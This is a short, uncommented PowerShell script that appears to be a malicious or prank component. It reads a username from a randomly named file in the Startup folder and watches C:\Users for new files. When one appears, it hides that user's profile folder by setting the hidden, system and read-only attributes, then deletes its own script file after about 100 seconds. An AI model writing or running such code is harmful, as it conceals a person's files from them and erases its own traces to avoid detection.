$global:user = (Get-Content "C:/Users/$env:userName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/etgtYmwQUO.txt").Trim()
[bool] $global:undone = $true

$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\Users"
$watcher.Filter = "*.*"
$watcher.IncludeSubdirectories = $false
$watcher.EnableRaisingEvents = $true

$action = { $path = $Event.SourceEventArgs.FullPath
            $changeType = $Event.SourceEventArgs.ChangeType
            attrib +h +s +r C:\Users\$user
            echo "hi" > .\hi.txt
}

Register-ObjectEvent $watcher "Created" -Action $action

while($undone) {
  Start-Sleep -Seconds 100
  $undone = $false
}

Remove-Item $PSCommandPath -Force
